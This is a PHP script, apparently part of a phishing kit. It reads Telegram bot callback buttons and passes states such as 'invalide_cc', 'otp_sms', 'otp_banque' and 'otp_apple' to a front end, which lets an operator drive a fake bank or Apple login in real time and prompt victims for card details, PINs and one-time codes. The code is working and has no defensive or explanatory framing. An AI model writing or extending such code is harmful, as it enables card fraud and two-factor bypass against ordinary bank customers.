<?php
include '../settings.php';
require __DIR__.'/vendor/autoload.php';

use Telegram\Bot\Api;
$telegram = new Api($bot_token); 
$lastUpdateId = file_get_contents('last_update_id.txt');
$updates = $telegram->getUpdates(['offset' => $lastUpdateId + 1]);

if (empty($updates)) {
    die('none');
}

$lastUpdate = end($updates);

if (!isset($lastUpdate['callback_query'])) {
    die('none');
}

$callbackData = $lastUpdate['callback_query']['data'];

file_put_contents('last_update_id.txt', $lastUpdate['update_id']);


if (in_array($callbackData, [
   
'invalide_cc', 
'invalide_sms',
'invalide_apple',
'invalide_banque',
'invalide_pin',
'otp_pin', 
'otp_sms',   
'otp_apple', 
'otp_banque',
'succes',  
    
    
])) {
    die($callbackData);
} else {
    
    die('none');
}
?>


